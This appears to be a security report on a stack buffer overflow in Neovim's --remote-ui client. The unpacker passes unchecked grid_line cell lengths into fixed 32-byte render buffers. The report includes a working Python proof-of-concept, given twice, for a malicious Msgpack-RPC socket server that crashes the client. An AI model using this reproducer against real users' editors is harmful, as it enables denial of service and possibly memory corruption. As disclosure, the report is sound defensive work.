# Remote UI `grid_line` cell length reaches a stack buffer overflow

## Broken invariant

`redraw/grid_line` cell text received from a Msgpack-RPC peer must be rejected unless it still satisfies Neovim's internal glyph invariant: the decoded cell payload must be shorter than `MAX_SCHAR_SIZE` before it is converted into `schar_T` and later rendered into fixed `char buf[MAX_SCHAR_SIZE]` stack buffers.

Today that invariant is broken in the redraw fast path:

- `unpacker_advance()` upgrades any notification whose method handler is `handle_ui_client_redraw` into the special `kMessageTypeRedrawEvent` path (`/home/node/workspace/neovim/src/nvim/msgpack_rpc/unpacker.c:314-316`).
- `unpacker_parse_redraw()` accepts an arbitrary peer-controlled string length for each `grid_line` cell and passes it straight to `schar_from_buf(cellbuf, cellsize)` (`/home/node/workspace/neovim/src/nvim/msgpack_rpc/unpacker.c:470-496`).
- `schar_from_buf()` explicitly requires the caller to ensure `len < MAX_SCHAR_SIZE` (`/home/node/workspace/neovim/src/nvim/grid.c:80-85`), but the unpacker never enforces that precondition.

In a release build this is not just a debug assertion issue: once the oversized glyph is interned, later rendering copies it back out with `schar_get()` into fixed 32-byte stack buffers, causing a real stack overflow.

## Input -> normalization -> policy gate -> sink

1. **Input**: a malicious Msgpack-RPC server accepts a documented `--remote-ui` connection (`/home/node/workspace/neovim/runtime/doc/remote.txt:55-60`) and sends a forged `redraw` notification containing:
   - a valid `grid_resize` event to initialize the UI grid, then
   - a `grid_line` event whose first cell string is attacker-controlled and much longer than 31 bytes.
2. **Normalization**:
   - `unpacker_parse_header()` resolves the method name `"redraw"` through the generic RPC dispatch table (`/home/node/workspace/neovim/src/nvim/msgpack_rpc/unpacker.c:239-257`, `/home/node/workspace/neovim/src/nvim/api/private/dispatch.c:11-22`).
   - `unpacker_advance()` then treats that notification as a redraw fast-path message (`/home/node/workspace/neovim/src/nvim/msgpack_rpc/unpacker.c:314-316`).
   - `unpacker_parse_redraw()` parses the nested `grid_line` structure and forwards the raw cell string length to `schar_from_buf()` without any `MAX_SCHAR_SIZE` check (`/home/node/workspace/neovim/src/nvim/msgpack_rpc/unpacker.c:435-496`).
3. **Policy gate**: there is no consumer-side validation that redraw cell text still obeys the producer-side glyph size invariant. Honest producers do preserve it:
   - outbound `grid_line` serialization uses `len = schar_get_adv(...)` and immediately stores that length into the wire format (`/home/node/workspace/neovim/src/nvim/api/ui.c:809-814`);
   - `MAX_SCHAR_SIZE` is only 32 bytes including the final NUL (`/home/node/workspace/neovim/src/nvim/types_defs.h:17-20`).
4. **Sink**:
   - after `grid_resize`, the remote UI client allocates `grid_line_buf_*` and later dispatches parsed raw lines into the TUI (`/home/node/workspace/neovim/src/nvim/ui_client.c:235-256`, `/home/node/workspace/neovim/src/nvim/ui_client.c:265-275`);
   - `tui_raw_line()` stores the attacker-derived `schar_T` into the screen grid and `print_cell_at_pos()` renders it (`/home/node/workspace/neovim/src/nvim/tui/tui.c:1803-1816`, `/home/node/workspace/neovim/src/nvim/tui/tui.c:1121-1153`);
   - `print_cell_at_pos()` uses `char buf[MAX_SCHAR_SIZE]; schar_get(buf, cell->data);` (`/home/node/workspace/neovim/src/nvim/tui/tui.c:1137-1139`);
   - `schar_get()` / `schar_get_adv()` then does `strlen(&glyph_cache.keys[idx])` followed by `memcpy(*buf_out, ..., len)` with no bound check (`/home/node/workspace/neovim/src/nvim/grid.c:150-165`).

That is the exploitable seam: attacker-controlled RPC bytes become an oversized glyph, the unpacker skips the glyph-length policy check, and the TUI later copies it into a fixed stack buffer.

## Why this invariant should have held

The fast path is clearly written around the assumption that redraw peers send already-canonicalized glyphs, not arbitrary strings:

- `schar_from_buf()` documents the precondition directly: the caller must ensure `len < MAX_SCHAR_SIZE` (`/home/node/workspace/neovim/src/nvim/grid.c:80-85`).
- the honest producer path in `api/ui.c` only serializes glyphs that already came out of `schar_get_adv()` (`/home/node/workspace/neovim/src/nvim/api/ui.c:809-814`).

So this is not a protocol-extension edge case; it is a missing validator on a privileged internal representation boundary.

## Minimal reproducer

### Reproducer file

```python
import os, socket, struct, sys, time

sock_path = sys.argv[1]
try:
    os.unlink(sock_path)
except FileNotFoundError:
    pass

def pack_uint(n: int) -> bytes:
    if 0 <= n < 0x80:
        return bytes([n])
    if n < 0x100:
        return b'\xcc' + bytes([n])
    if n < 0x10000:
        return b'\xcd' + struct.pack('>H', n)
    return b'\xce' + struct.pack('>I', n)

def pack_bool(v: bool) -> bytes:
    return b'\xc3' if v else b'\xc2'

def pack_str(s: str) -> bytes:
    b = s.encode()
    n = len(b)
    if n < 32:
        return bytes([0xA0 | n]) + b
    if n < 0x100:
        return b'\xd9' + bytes([n]) + b
    if n < 0x10000:
        return b'\xda' + struct.pack('>H', n) + b
    return b'\xdb' + struct.pack('>I', n) + b

def pack_array(items) -> bytes:
    n = len(items)
    if n < 16:
        head = bytes([0x90 | n])
    elif n < 0x10000:
        head = b'\xdc' + struct.pack('>H', n)
    else:
        head = b'\xdd' + struct.pack('>I', n)
    return head + b''.join(items)

def rpc_notification(method: str, events) -> bytes:
    return pack_array([pack_uint(2), pack_str(method), pack_array(events)])

def redraw_event(name: str, *calls) -> bytes:
    return pack_array([pack_str(name), *calls])

def arg_array(*items) -> bytes:
    return pack_array(list(items))

srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
srv.bind(sock_path)
srv.listen(1)
conn, _ = srv.accept()
conn.recv(65536)  # nvim_ui_attach / nvim_set_client_info
time.sleep(0.5)

resize = rpc_notification('redraw', [
    redraw_event('grid_resize', arg_array(pack_uint(1), pack_uint(80), pack_uint(2))),
    redraw_event('flush', arg_array()),
])

huge = 'A' * 4000
mal = rpc_notification('redraw', [
    redraw_event('grid_line', arg_array(
        pack_uint(1),
        pack_uint(0),
        pack_uint(0),
        pack_array([
            pack_array([
                pack_str(huge),
                pack_uint(0),
            ])
        ]),
        pack_bool(False),
    )),
    redraw_event('flush', arg_array()),
])

conn.sendall(resize)
time.sleep(0.2)
conn.sendall(mal)
time.sleep(5)
```

### Commands

```bash
cat >/tmp/10-rpc-unpacker-repro.py <<'EOF'
import os, socket, struct, sys, time

sock_path = sys.argv[1]
try:
    os.unlink(sock_path)
except FileNotFoundError:
    pass

def pack_uint(n: int) -> bytes:
    if 0 <= n < 0x80:
        return bytes([n])
    if n < 0x100:
        return b'\xcc' + bytes([n])
    if n < 0x10000:
        return b'\xcd' + struct.pack('>H', n)
    return b'\xce' + struct.pack('>I', n)

def pack_bool(v: bool) -> bytes:
    return b'\xc3' if v else b'\xc2'

def pack_str(s: str) -> bytes:
    b = s.encode()
    n = len(b)
    if n < 32:
        return bytes([0xA0 | n]) + b
    if n < 0x100:
        return b'\xd9' + bytes([n]) + b
    if n < 0x10000:
        return b'\xda' + struct.pack('>H', n) + b
    return b'\xdb' + struct.pack('>I', n) + b

def pack_array(items) -> bytes:
    n = len(items)
    if n < 16:
        head = bytes([0x90 | n])
    elif n < 0x10000:
        head = b'\xdc' + struct.pack('>H', n)
    else:
        head = b'\xdd' + struct.pack('>I', n)
    return head + b''.join(items)

def rpc_notification(method: str, events) -> bytes:
    return pack_array([pack_uint(2), pack_str(method), pack_array(events)])

def redraw_event(name: str, *calls) -> bytes:
    return pack_array([pack_str(name), *calls])

def arg_array(*items) -> bytes:
    return pack_array(list(items))

srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
srv.bind(sock_path)
srv.listen(1)
conn, _ = srv.accept()
conn.recv(65536)
time.sleep(0.5)

resize = rpc_notification('redraw', [
    redraw_event('grid_resize', arg_array(pack_uint(1), pack_uint(80), pack_uint(2))),
    redraw_event('flush', arg_array()),
])

huge = 'A' * 4000
mal = rpc_notification('redraw', [
    redraw_event('grid_line', arg_array(
        pack_uint(1),
        pack_uint(0),
        pack_uint(0),
        pack_array([
            pack_array([
                pack_str(huge),
                pack_uint(0),
            ])
        ]),
        pack_bool(False),
    )),
    redraw_event('flush', arg_array()),
])

conn.sendall(resize)
time.sleep(0.2)
conn.sendall(mal)
time.sleep(5)
EOF

python3 /tmp/10-rpc-unpacker-repro.py /tmp/10-rpc-unpacker.sock >/tmp/10-rpc-unpacker-server.log 2>&1 &
timeout 12 script -qefc \
  "TERM=xterm-256color nvim --clean --server /tmp/10-rpc-unpacker.sock --remote-ui" \
  /tmp/10-rpc-unpacker.typescript
```

### Expected

- The client should reject the malformed `grid_line` cell text as an invalid redraw payload and survive the connection attempt.

### Actual

- On this box (`nvim v0.12.1`, release build), the client aborts immediately with glibc's stack-buffer protection:

```text
*** buffer overflow detected ***: terminated
```

- The recorded transcript ends with:

```text
Script done ... [COMMAND_EXIT_CODE="134"]
```

So a single forged `redraw/grid_line` notification from the connected peer is enough to crash the `--remote-ui` client.

## Affected files

- `/home/node/workspace/neovim/src/nvim/msgpack_rpc/unpacker.c:314-316`
  - any notification named `redraw` is promoted into the redraw fast path.
- `/home/node/workspace/neovim/src/nvim/msgpack_rpc/unpacker.c:435-496`
  - `grid_line` cells are decoded manually and `cellsize` is forwarded to `schar_from_buf()` without a `MAX_SCHAR_SIZE` check.
- `/home/node/workspace/neovim/src/nvim/api/private/dispatch.c:11-22`
  - generic RPC method lookup resolves `"redraw"` through the normal handler table.
- `/home/node/workspace/neovim/src/nvim/api/ui.c:809-814`
  - honest redraw producers serialize only already-canonicalized glyphs, which is the invariant the consumer incorrectly trusts.
- `/home/node/workspace/neovim/src/nvim/ui_client.c:235-256`
  - `grid_resize` initializes the remote UI buffers used by the fast path.
- `/home/node/workspace/neovim/src/nvim/ui_client.c:265-275`
  - parsed raw lines are handed directly to the TUI renderer.
- `/home/node/workspace/neovim/src/nvim/grid.c:80-85`
  - `schar_from_buf()` documents the missing precondition and asserts it in debug builds.
- `/home/node/workspace/neovim/src/nvim/grid.c:150-165`
  - `schar_get()` / `schar_get_adv()` copy the interned glyph back out with no length bound.
- `/home/node/workspace/neovim/src/nvim/tui/tui.c:1137-1139`
  - `print_cell_at_pos()` renders into a fixed `char buf[MAX_SCHAR_SIZE]`.
- `/home/node/workspace/neovim/src/nvim/tui/tui.c:1803-1816`
  - `tui_raw_line()` feeds the attacker-derived `schar_T` values into the render path.
- `/home/node/workspace/neovim/runtime/doc/remote.txt:55-60`
  - `--remote-ui` is a documented, user-facing entrypoint for this trust boundary.

## Impact / severity

This is a real memory-corruption bug on a core Msgpack-RPC boundary.

Reachability is narrower than a plain `--listen` server bug because the victim must opt into `--remote-ui`, but once they do, the connected peer can crash the client with a single protocol-valid `redraw` batch. The exploit is not "just" a rejected malformed message: the bytes survive parsing, get normalized into an internal glyph representation, and then overflow a fixed stack buffer during rendering.

I would rate this as **moderate-to-high severity**:

- the trigger is one attacker-controlled RPC notification from the connected peer;
- the sink is stack memory corruption, not a clean disconnect;
- hardened builds on this box abort reliably with `*** buffer overflow detected ***`;
- less-hardened builds may turn the same bug into a stronger control-flow primitive.
